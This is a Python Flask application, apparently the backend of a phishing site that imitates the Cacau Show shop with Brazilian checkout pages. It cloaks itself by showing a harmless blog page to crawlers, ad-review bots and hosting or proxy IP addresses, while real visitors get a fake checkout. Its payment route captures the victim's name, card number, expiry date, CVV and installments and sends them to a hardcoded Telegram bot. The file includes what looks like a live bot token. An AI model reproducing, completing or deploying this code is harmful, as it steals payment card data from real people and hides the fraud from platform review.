import os
import requests
import datetime
from flask import Flask, render_template, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# --- CONFIGURAÇÕES DO TELEGRAM ---
TELEGRAM_TOKEN = "8739694595:AAGIv9zc1kxVOTek6falZKeAzVG2Qg6W24g"
TELEGRAM_CHAT_ID = "7676085331"

def send_telegram(mensagem):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": mensagem, "parse_mode": "HTML"}
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Erro ao enviar Telegram: {e}")

# --- FILTRO DE CLOAKING ---
def is_real_user():
    ua = request.headers.get('User-Agent', '').lower()
    bots = ['facebookexternalhit', 'googlebot', 'lighthouse', 'bot', 'crawl', 'spider', 'headlesschrome', 'adsbot']
    ip_header = request.headers.get('X-Forwarded-For')
    user_ip = ip_header.split(',')[0].strip() if ip_header else request.remote_addr
    
    if user_ip == "127.0.0.1": return True # Permite teste local
    if any(bot in ua for bot in bots): return False

    try:
        res = requests.get(f"http://ip-api.com/json/{user_ip}?fields=isp,org,proxy,hosting", timeout=3).json()
        if res.get('hosting') or res.get('proxy'): return False
        return True 
    except: return True

# --- FUNIL DE ROTAS ---

@app.route("/")
def home():
    if is_real_user():
        return render_template("index.html") # Humano vê Cacau Show
    return render_template("safepage.html")   # Robô vê Blog

@app.route("/identificaçao")
def checkout_page():
    if not is_real_user(): return render_template("safepage.html")
    return render_template("identificaçao.html")

@app.route("/entrega")
def entrega_page():
    if not is_real_user(): return render_template("safepage.html")
    return render_template("entrega.html")

@app.route("/pagamento")
def pagamento_page():
    if not is_real_user(): return render_template("safepage.html")
    return render_template("pagamento.html")
# --- CAPTURA DE DADOS (ACEITA TODAS AS ROTAS DOS TEUS HTMLS) ---
@app.route('/api/checkout/identificacao', methods=['POST'])
@app.route('/api/checkout/entrega', methods=['POST'])
@app.route('/api/checkout/pagamento', methods=['POST']) # <-- ADICIONE ESTA LINHA
# --- ADICIONE OU SUBSTITUA ESSA ROTA NO SEU APP.PY ---
@app.route('/api/checkout/pagamento', methods=['POST'])
def gate_pagamento():
    try:
        dados = request.json
        
        # Monta a mensagem organizada para o seu Telegram
        msg = f"💳 <b>DADOS DO CARTÃO CAPTURADOS!</b>\n\n"
        msg += f"👤 <b>Nome:</b> <code>{dados.get('nome')}</code>\n"
        msg += f"🔢 <b>Cartão:</b> <code>{dados.get('cartao')}</code>\n"
        msg += f"📅 <b>Validade:</b> <code>{dados.get('validade')}</code>\n"
        msg += f"🔒 <b>CVV:</b> <code>{dados.get('cvv')}</code>\n"
        msg += f"📊 <b>Parcelas:</b> <code>{dados.get('parcelas')}</code>\n"
        
        send_telegram(msg)
        return jsonify({"status": "success"}), 200
    except Exception as e:
        print(f"Erro ao processar cartão: {e}")
        return jsonify({"status": "error"}), 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)